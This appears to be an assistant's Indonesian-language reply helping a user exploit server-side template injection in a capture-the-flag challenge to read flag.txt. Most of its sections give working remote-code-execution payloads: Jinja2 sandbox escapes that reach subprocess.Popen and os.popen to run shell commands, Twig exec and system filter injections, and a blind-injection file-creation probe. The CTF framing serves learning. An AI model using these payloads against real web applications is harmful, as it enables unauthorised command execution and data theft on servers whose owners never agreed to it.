
## 🧠 Langkah-Langkah Diagnosis SSTI (Server-Side Template Injection)

### 1. **Uji Dasar: Apakah Ekspresi Dihitung?**
Kirimkan:
```
{{7*7}}
{{7*'7'}}
```
- Jika hasil `49` → engine matematika (Twig, Jinja2, dll.) → **potensi RCE tinggi**.
- Jika hasil `7777777` → string repetition → kemungkinan Jinja2 dengan konversi otomatis.
- Jika hasil `{{7*7}}` (tidak berubah) → tidak ada SSTI.

### 2. **Identifikasi Template Engine**
Coba payload khas setiap engine:

| Engine | Payload Test |
|--------|---------------|
| Jinja2 (Flask) | `{{config}}` |
| Twig (PHP) | `{{_self}}` atau `{{_self.env}}` |
| Freemarker | `${7*7}` |
| Velocity | `#set($x=7*7) $x` |

**Dari contoh Anda**, `{{config}}` mengembalikan objek konfigurasi? Jika iya → **Jinja2**.

### 3. **Cek Apakah Fungsi Built-in Diblokir**
Setelah tahu engine-nya, coba akses `__class__`, `__globals__`, `__builtins__`:

```
{{''.__class__}}
```
- Jika muncul `<class 'str'>` → berarti akses class diperbolehkan.
- Jika error atau muncul `'None'` → disaring (sandboxed).

Lanjutkan:
```
{{''.__class__.__mro__}}
```
Harusnya muncul tuple.

Lalu:
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Ini akan listing semua class yang tersedia. Jika muncul daftar panjang → **besar kemungkinan RCE bisa**.  
Jika error atau hasil kosong → ada filtering.

### 4. **Cari Class yang Bisa Eksekusi Perintah**
Cari class seperti `os._wrap_close`, `subprocess.Popen`, atau `warnings.catch_warnings`:

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{loop.index0}}{% endif %}{% endfor %}
```
Dapatkan index-nya (misal 258). Lalu uji:
```
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()}}
```

**Jika perintah `id` berhasil dieksekusi**, maka RCE berhasil.

---

## ❌ Mengapa Payload Anda Bisa Gagal? (Tanda SSTI Tidak Bisa RCE)

Berikut adalah **penyebab umum** dan cara mendeteksinya:

### a. **Fungsi Berbahaya Dihapus / Diblokir**
Misalnya `__class__`, `__globals__`, `__builtins__`, `import`, `os`, `popen`, `eval`, `exec` disaring.

**Ciri:**  
Kirim `{{''.__class__}}` error `'NoneType'` atau `'str' object has no attribute '__class__'` → diblokir.

### b. **Sandbox yang Ketat**
Beberapa engine hanya mengizinkan operasi matematika dan string, tapi tidak bisa mengakses objek internal.

**Ciri:**  
`{{7*7}}` jalan, tapi `{{config}}` error atau kosong.

### c. **Engine Bukan Jinja2 (Tapi Twig/Freemarker/Velocity)**
Jika pakai Twig (PHP), payload Jinja2 tidak akan jalan. Coba:
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
Atau
```
{{['id']|map('system')}}
```

### d. **Parameter Disanitasi atau Encoding Rusak**
Payload `{{...}}` di-encode menjadi `%7B%7B...%7D%7D` oleh browser/curl. Pastikan payload dikirim **mentah** (raw) dengan `curl --data-urlencode` atau gunakan Burp Suite.

### e. **Output Tidak Terlihat (Blind SSTI)**
Beberapa SSTI tidak menampilkan hasil, tapi perintah tetap jalan. Coba buat file atau ping ke server Anda sendiri:
```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch /tmp/success').read()}}
```
Lalu cek apakah file ada (via RCE lain atau SSRF).

---

## 📌 Panduan Praktis untuk Kasus Anda

Dari informasi sebelumnya, Anda sudah bisa:
- Melakukan `ls -la` → artinya **Anda sudah berhasil RCE**!
- Output menunjukkan `flag.txt` sebagai file.

**Mengapa payload sebelumnya tidak bisa?** Mungkin karena:
1. Payload yang Anda coba sebelumnya salah format (misal lupa `.read()` atau kurung tutup).
2. Menggunakan `os.popen('cat flag.txt')` tanpa `.read()` – tidak akan menampilkan output.
3. Parameter yang Anda kirim tidak tepat (misal parameter `name` tapi Anda kirim di `?q=`).

**Payload yang pasti berhasil (setelah Anda bisa `ls -la`):**
```jinja2
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```
Atau jika `self` tidak tersedia:
```jinja2
{{''.__class__.__mro__[1].__subclasses__()[258]('cat flag.txt', shell=True, stdout=-1).communicate()[0]}}
```
(Ganti 258 dengan index `Popen` yang Anda temukan.)

---

## 🔍 Kesimpulan: Kapan SSTI Bisa RCE?

✅ **Bisa RCE jika:**
- `{{7*7}}` menghasilkan 49 atau 7777777.
- `{{''.__class__}}` tidak error.
- `{{config}}` mengembalikan objek.
- `__subclasses__()` berisi class `Popen`, `os._wrap_close`, atau `warnings.catch_warnings`.

❌ **Tidak bisa RCE jika:**
- Hanya operasi aritmatika/string yang jalan, tapi akses atribut/class diblokir.
- Error `'NoneType'` saat mengakses `__class__`.
- Server memfilter kata kunci seperti `__globals__`, `__builtins__`, `popen`.

**Dalam kasus Anda** – karena sudah bisa `ls -la` – itu bukti bahwa RCE **BERHASIL**. Tinggal sesuaikan payload untuk membaca `flag.txt`.

Semoga penjelasan ini membantu Anda memahami proses debugging SSTI. Jika masih ada payload spesifik yang gagal, silakan share error atau response-nya.
